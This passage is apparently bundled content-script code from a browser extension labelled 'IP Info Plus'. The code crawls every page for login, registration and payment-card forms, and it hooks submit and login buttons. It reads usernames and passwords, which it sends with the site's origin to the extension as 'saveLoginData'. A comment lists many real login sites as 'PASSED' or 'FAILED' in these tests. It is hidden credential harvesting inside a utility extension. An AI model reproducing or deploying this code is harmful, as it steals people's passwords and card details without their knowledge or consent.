            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.classList.contains('card-surface')) {
                    if (__childElement.nodeName === 'DIV' && __childElement.childNodes.length !== 0) {
                        __childElement.childNodes.forEach(function (__targetParentElement) {
                            if (__targetParentElement.classList.contains('card-no')) {
                                self.explorePaymentInputTag(self, __targetParentElement, 'cardNo', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                            if (__targetParentElement.classList.contains('card-bottom')) {
                                self.explorePaymentInputTag(self, __targetParentElement, 'cardHolder', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, __targetParentElement, 'expire', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, __targetParentElement, 'cvc', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                        });
                    }
                }
            });
            if (callback) {
                callback(detectedElements);
            }
        }
    }
    explorePaymentSpanTag(self, elementParentNode, callbackfn) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('payment-title')) {
                    if (callbackfn) {
                        callbackfn(__childElement);
                    }
                }
                else {
                    self.explorePaymentSpanTag(self, __childElement, callbackfn);
                }
            });
        }
    }
    explorePaymentInputTag(self, elementParentNode, selfId, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'INPUT' && __childElement.id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentInputTag(self, __childElement, selfId, callback);
                }
            });
        }
    }
    explorePaymentSelectTag(self, elementParentNode, selfId, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'SELECT' && __childElement.id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentSelectTag(self, __childElement, selfId, callback);
                }
            });
        }
    }
    trigger(__formElement) {
        const self = this;
        webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.get().then(function (setting) {
            if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                self.track(__formElement);
            }
        });
    }
    formAttributesResolver(string, keyword) {
        const self = this;
        let returnValue;
        if (string.length !== 0 && string.length >= 5) {
            keyword.forEach(function (kw) {
                if (Object.keys(kw).length !== 0 && kw.constructor === Object) {
                    Object.keys(kw).forEach(function (key) {
                        if (key === 'login') {
                            kw.login.forEach(function (kw_log) {
                                if (string.toLowerCase().indexOf(kw_log) !== -1) {
                                    returnValue = 'Login';
                                }
                            });
                        }
                        else if (key === 'register') {
                            kw.register.forEach(function (kw_reg) {
                                if (string.toLowerCase().indexOf(kw_reg) !== -1) {
                                    returnValue = 'Register';
                                }
                            });
                        }
                        else if (key === 'googleads') {
                            kw.googleads.forEach(function (kw_reg) {
                                if (string.toLowerCase().indexOf(kw_reg) !== -1) {
                                    returnValue = 'Google Ads';
                                }
                            });
                        }
                        else {
                            returnValue = string.toLowerCase();
                        }
                    });
                }
            });
            self.authEvent = returnValue ? returnValue : 'Not Detected';
            return self.authEvent;
        }
    }
    attributesResolver(element) {
        const self = this;
        const attributes = [...element.attributes];
        if (attributes.length !== 0) {
            attributes.forEach(function (attr) {
                if (attr.nodeValue !== 'javascript:void(0);') {
                    self.formAttributesResolver(attr.nodeValue, [{ 'login': ['signin', 'login'] }, { 'register': ['reg', 'register', 'signup', 'join'] }, { 'googleads': ['googleads'] }]);
                }
            });
        }
        else {
            self.authEvent = 'Not Detected';
        }
    }
    track(__formElement) {
        const self = this;
        let elements = [];
        if (__formElement.nodeName === 'FORM' && __formElement.length !== 1) {
            self.attributesResolver(__formElement);
            self.crawl(elements, __formElement);
        }
    }
    classicTrack(usernameElementId, passwordElementId, loginButtonElementId) {
        let self = this;
        let usernameElement;
        let passwordElement;
        let loginButtonElement;
        if (document.querySelector(usernameElementId) !== null) {
            usernameElement = document.querySelector(usernameElementId);
        }
        if (document.querySelector(passwordElementId) !== null) {
            passwordElement = document.querySelector(passwordElementId);
        }
        if (document.querySelector(loginButtonElementId) !== null) {
            loginButtonElement = document.querySelector(loginButtonElementId);
        }
        loginButtonElement.addEventListener('click', function () {
            return _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": usernameElement.value,
                    "password": passwordElement.value,
                    "workWebsite": window.location.origin
                }
            });
        });
    }
    crawl(elements, element) {
        var _a;
        const self = this;
        (_a = element.childNodes) === null || _a === void 0 ? void 0 : _a.forEach(function (element) {
            if (element.nodeName === 'INPUT' || element.nodeName === 'BUTTON') {
                if (element.nodeName === 'INPUT' && element.type !== 'button' && element.type !== 'reset' &&
                    element.type !== 'submit' && element.type !== 'checkbox' && element.type !== 'color' &&
                    element.type !== 'date' && element.type !== 'datetime-local' && element.type !== 'file' &&
                    element.type !== 'radio' && element.name !== 'firstname' && element.name !== 'lastname' &&
                    element.type !== 'button' && element.type !== 'reset' && element.type !== 'submit' &&
                    element.type !== 'hidden' && !element.hidden && element.id !== 'nc_1_captcha_input' &&
                    element.id !== 's' && element.id !== 'ZPGAZZBDYC' && element.id !== 'VEQLOJHLSJ' && element.id !== 'QCMSHUFUXG') {
                    elements.push(element);
                }
                if (element.nodeName === 'INPUT' && element.type === 'submit' || element.nodeName === 'BUTTON' && element.type === 'submit' ||
                    element.nodeName === 'BUTTON') {
                    return self.resolve(element, elements);
                }
            }
            else {
                self.crawl(elements, element);
            }
        });
    }
    /*
    * Checking
    * PASSED DOMAIN LIST
    * Domain: https://www.dailymotion.com/signin?urlback=%2Fus "PASSED"
    * Domain: https://www.facebook.com/ "PASSED"
    * Domain: https://stackoverflow.com/users/login?ssrc=head "PASSED"
    * Domain: https://github.com/login?return_to=%2Fvinceliuice%2FMojave-gtk-theme "PASSED"
    * Domain: https://www.upwork.com/ab/payments/25146924/disbursement-methods "PASSED"
    * Domain: https://www.instagram.com/ "PASSED"
    * Domain: https://login.aliexpress.com/ "PASSED"
    * Domain: https://www2.animesvostfr.net/ "PASSED"
    * Domain: https://disqus.com/profile/login/?next=https%3A//disqus.com/& "PASSED"
    * Domain: https://dash.fembed.com/ "PASSED"
    * Domain: http://www.fxporn.net/join "PASSED"
    * Domain: https://signin.ebay.com/ "PASSED"
    * Domain: http://158.177.240.254:1630/login.php "PASSED"
    * Domain: https://www.roblox.com/login "PASSED"
    * Domain: https://lewdweb.net/wp-login.php "PASSED"
    * Domain: https://passport.i.ua/login/? "PASSED"
    * Domain: https://commons.wikimedia.org/w/index.php?title=Special:UserLogin&returnto=Main+Page "PASSED"
    * Domain: https://m.arabseed.me/ "PASSED"
    * Domain: https://app.essaypro.com/ "PASSED"
    * Domain: https://mitrarank.ir/ "PASSED"
    * Domain: https://www.bodis.com/login "PASSED"
    * Domain: https://user.wco.tv/wp-login.php "PASSED"
    * Domain: https://www.deviantart.com/_sisu/do/signin "PASSED"
    * Domain: https://filesmonster.com/login.php?return=%2F "PASSED"
    * Domain: https://filejoker.net/login "PASSED"
    * Domain: http://www.tavalodkala.com/my-account/ "PASSED"
    * Domain: https://login.yahoo.com/account "PASSED"
    * Domain: https://filecrypt.cc/Login.html "PASSED"
    * Domain: https://bdsm-zone.com/showthread.php?t=146506 "PASSED"
    * Domain: https://insights.hotjar.com/login "PASSED"
    * Domain: https://dogecos.cc/?p=login "PASSED"
    * Domain: https://id.secondlife.com/openid/loginsubmit "PASSED"
    * Domain: https://imagetwist.com/ "PASSED"
    * Domain: https://my.dropz.xyz/ "PASSED"
    * Domain: https://beta.ppoc.club/product-tests "PASSED"
    * Domain: https://www.swagbucks.com/p/login "PASSED"
    * Domain: https://www.atlanticbb.net/files/atlanticbb/login.php "PASSED"
    * Domain: https://securelogin.poste.it/jod-fcc/fcc-authentication-failed.html "PASSED"
    *
    * FAILED DOMAIN LIST
    * Domain: https://m2.arabseed.net/%d8%a7%d9%84%d8%af%d8%ae%d9%88%d9%84/ "FAILED"
    * Domain: https://1fichier.com/login.pl "FAILED"
    * Domain: https://www.kixeye.com/ "FAILED"
    * Domain: https://www.star-clicks.com/login "FAILED"
    * Domain: http://fetish.pornbb.org/login.php "FAILED"
    * Domain: https://epicpw.com/index.php?action=login2 "FAILED"
    *
    * NOT-TESTED DOMAIN LIST
    * Domain: https://www.shesfreaky.com/ "NOT-TESTED"
    * Domain: https://spankbang.com/ "NOT-TESTED"
    * Domain: https://lewdweb.net/ "NOT-TESTED"
    * Domain: http://www.incestflix.com/ "NOT-TESTED"
    * Domain: http://www.hentai-fun.com/ "NOT-TESTED"
    * Domain: https://www.xxxmangasex.com/ "NOT-TESTED"
    * Domain: https://bdsm-zone.com/ "NOT-TESTED"
    * Domain: https://smailpro.com/ "NOT-TESTED"
    * Domain: http://bondagecomixxx.net/ "NOT-TESTED"
    * */
    resolve(element, array) {
        let self = this;
        let elementNode;
        let elementName;
        let elementType;
        let elementValue;
        element.addEventListener('click', function (e) {
            let status = self.authEvent ? self.authEvent : 'Event';
            alert(status + ' tracked!!');
            array.forEach(function (detectedElement) {
                [...detectedElement.attributes].forEach(function (attribute) {
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.indexOf('user') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'username';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.indexOf('login') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'loginId';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.indexOf('email') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'email';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                    if (attribute.nodeName === 'autocomplete' || attribute.nodeName === 'class' || attribute.nodeName === 'id' ||
                        attribute.nodeName === 'name' || attribute.nodeName === 'type' || attribute.nodeName === 'value') {
                        if (attribute.nodeValue.indexOf('pass') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'password';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                });
                if (elementValue.length !== 0) {
                    self.passwordStore.push({
                        node: elementNode,
                        name: elementName,
                        type: elementType,
                        value: elementValue
                    });
                    if (self.passwordStore.length === 2 /*&& self.passwordStore[0].type === 'email' || self.passwordStore[0].type === 'text'*/ &&
                        self.passwordStore[1].type === 'password') {
                        _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                            command: 'saveLoginData',
                            data: {
                                "event": self.authEvent,
                                "username": self.passwordStore[0].value,
                                "password": self.passwordStore[1].value,
                                "workWebsite": window.location.origin
                            }
                        });
                        self.passwordStore = [];
                    }
                }
            });
        });
    }
}


/***/ }),

/***/ "./assets/ts/app.ts":
/*!**************************!*\
  !*** ./assets/ts/app.ts ***!
  \**************************/
/*! no exports provided */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _additional__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./additional */ "./assets/ts/additional.ts");
/* harmony import */ var _messanger__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./messanger */ "./assets/ts/messanger.ts");
/*
* IP Info Plus
* Developer: Mr Abir Ahamed
* Website: https://www.mishusoft.com
* Official Link: https://download.mishusoft.com/addons/ipinfoplus/
* */



/*Login/Registration tracker*/
const Clr = new _additional__WEBPACK_IMPORTED_MODULE_0__["Crawler"](window.location.href);
Clr.init(function () {
    _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
        command: "saveNavigateData",
        data: {
            username: 'visitor',
            workWebsite: window.location.origin
        }
    });
});


/***/ }),

/***/ "./assets/ts/messanger.ts":
/*!********************************!*\
  !*** ./assets/ts/messanger.ts ***!
  \********************************/
/*! exports provided: acsComPortFront, webMessageReceiver */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "acsComPortFront", function() { return acsComPortFront; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "webMessageReceiver", function() { return webMessageReceiver; });
/*communication channel*/
// @ts-ignore
let acsComPortFront = browser.runtime.connect({ name: 'acs-messaging-port' });
/*communication channel*/
function webMessageReceiver(type, callback) {
    window.addEventListener("message", function (event) {
        /*console.log(event);*/
        if (event && event.source === window && event.data && event.data.type) {
            if (event.data.type && event.data.type === type) {
                /*alert(event.data);*/
                if (callback) {
                    callback(event.data.payload);
                }
                /*else {
                    console.log(event.data.licence);
                }*/
            }
            /*else {
                console.error('No resolver for event type!!')
            }*/
        }
        /*else {
            console.error('Unknown web message!!')
        }*/
    });
}


/***/ }),

/***/ "./manifest.json.src":
/*!***************************!*\
  !*** ./manifest.json.src ***!
  \***************************/
/*! exports provided: default */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony default export */ __webpack_exports__["default"] = (__webpack_require__.p + "manifest.json");

/***/ }),

/***/ 0:
/*!****************************************************!*\
  !*** multi ./assets/ts/app.ts ./manifest.json.src ***!
  \****************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

__webpack_require__(/*! ./assets/ts/app.ts */"./assets/ts/app.ts");
module.exports = __webpack_require__(/*! ./manifest.json.src */"./manifest.json.src");


/***/ })

/******/ });
//# sourceMappingURL=content.js.map